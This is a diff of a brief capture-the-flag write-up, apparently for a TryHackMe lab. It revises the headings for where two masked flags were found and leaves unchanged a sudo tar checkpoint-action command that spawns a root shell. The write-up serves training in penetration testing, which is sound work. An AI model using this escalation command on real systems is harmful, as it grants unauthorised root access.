@@ -21,10 +21,10 @@ user: ***
 password: *******************
 
 ```
-## Found flag1: `THM{*****_*********}`
+### Found flag1 on the User's Desktop: `THM{*****_*********}`
 
 ## Using sudo -l found that user can run tar as sudo 
 `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
-opens a shell as root and then found root flag under **/root/root.txt**
+opens a shell as root 
 
-## Found flag2:`THM{******_******}`
+### Found flag2 under the root's Desktop **/root/root.txt** :`THM{******_******}`
